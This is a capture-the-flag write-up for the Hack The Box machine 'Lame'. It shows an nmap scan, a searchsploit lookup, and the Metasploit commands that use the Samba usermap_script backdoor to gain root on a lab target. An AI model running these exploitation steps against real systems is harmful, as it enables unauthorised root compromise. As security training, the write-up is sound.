# Hack the box - Lame

<img align="left" src="logo.png">
&nbsp;<span style="color:#b5e853; font-weight: bold">OS: <img align="top" src="../../../images/linux.png"> </span><b>Linux</b>
&nbsp;<span style="color:#b5e853; font-weight: bold">IP: </span><b>10.10.10.3</b>

&nbsp;<span style="color:#b5e853; font-weight: bold">Difficulity: </span><b>Easy</b>
&nbsp;<span style="color:#b5e853; font-weight: bold">Release: </span><b>2017 Mar 14</b>

___

## Port scanning
```
nmap -sC -sV -T4 -oA nmap 10.10.10.3
```
![Nmap results](./nmap.png)

We can see there is anonymous FTP login on port 21 and 2 samba smbd services running.

___

## Gaining access

We will use searchsploit for checking vulnerabilities:

```
searchsploit samba 3 metasploit
```

![Searchsploit](./searchsploit.png)

Now it is clear that we can use metasploit to exploit backdoor vulnerability:

```
msfconsole
use exploit/multi/samba/usermap_script
set rhosts 10.10.10.3
exploit
```

![Exploiting](./exploiting.png)

After successful exploit, it seems that we have root access to the system so we can easily get the flags:

![Capturing the flags](./capturing_flags.png)